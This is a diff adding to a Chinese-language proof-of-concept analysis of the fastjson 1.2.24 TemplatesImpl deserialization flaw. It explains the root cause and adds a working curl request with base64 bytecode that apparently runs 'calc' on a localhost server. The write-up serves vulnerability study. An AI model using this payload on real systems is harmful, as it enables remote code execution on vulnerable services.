@@ -603,4 +603,12 @@ public void setValue(Object object, Object value) {
 Object result = JSON.parseObject(requestBody,Feature.SupportNonPublicField);
 ```
 
-这一句就是漏洞触发的根源，Feature.SupportNonPublicField是为了
+这一句就是漏洞触发的根源，Feature.SupportNonPublicField是为了修改 private _bytecodes的，TemplatesImpl本身就没setter，所以想用修改_bytecodes，就只能寄希望于Feature.SupportNonPubl
+
+icField. _bytecodes 是字节码，字节码最后反序列化为jvm中的恶意类，加载恶意类时触发static代码块，实现rce
+
+```text
+curl -X POST "http://localhost:8888/api/user/info" -H "Content-Type: application/json" -d "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAnTG9yZy9hcGFjaGUvbWF2ZW4vYXJjaGV0eXBlcy9NYWluJHRlc3Q7AQAKU291cmNlRmlsZQEACU1haW4uamF2YQwABAAFBwATAQAlb3JnL2FwYWNoZS9tYXZlbi9hcmNoZXR5cGVzL01haW4kdGVzdAEAEGphdmEvbGFuZy9PYmplY3QBACBvcmcvYXBhY2hlL21hdmVuL2FyY2hldHlwZXMvTWFpbgEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAGVcwMWZoNGNrZXIxOTI5MTYzMDkzNjYxMDABABtMVzAxZmg0Y2tlcjE5MjkxNjMwOTM2NjEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAMAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\"],\"_name\":\"W01h4cker\",\"_tfactory\":{},\"_outputProperties\":{}}"
+```
+
+![执行结果](https://github.com/tiandeyiliushang-sudo/fastjson-1.2.24-TemplatesImpl/blob/main/poc%E5%88%86%E6%9E%90/%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png)
